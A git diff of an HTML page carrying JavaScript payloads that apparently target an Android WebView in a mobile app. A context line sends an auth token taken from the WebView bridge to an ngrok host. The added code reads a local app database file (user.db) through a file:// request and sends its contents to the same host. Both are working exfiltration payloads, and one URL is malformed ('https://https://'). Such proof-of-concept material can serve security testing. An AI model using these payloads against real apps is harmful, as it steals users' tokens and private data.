@@ -44,6 +44,30 @@
         location.href = "https://https://7d15-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?leaked_token=" + RNCWebViewManager.JAVASCRIPT_INTERFACE.getAuthToken();
     </script>	
         
+//file access from file URIs
+	    
+	    <script type="text/javascript">
+        function theftFile(path, callback) {
+          var req = new XMLHttpRequest();
+
+          req.open("GET", "file://" + path, true);
+          req.onload = function(e) {
+            callback(req.responseText);
+          }
+          req.onerror = function(e) {
+            callback(null);
+          }
+          req.send();
+        }
+
+        var file = "/data/data/Android/app.phantom/databases/user.db";
+
+        theftFile(file, function(contents) {
+            location.href = "https://7d15-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
+        });
+    </script>
+ 
+	    
     </body>
 </html>
 
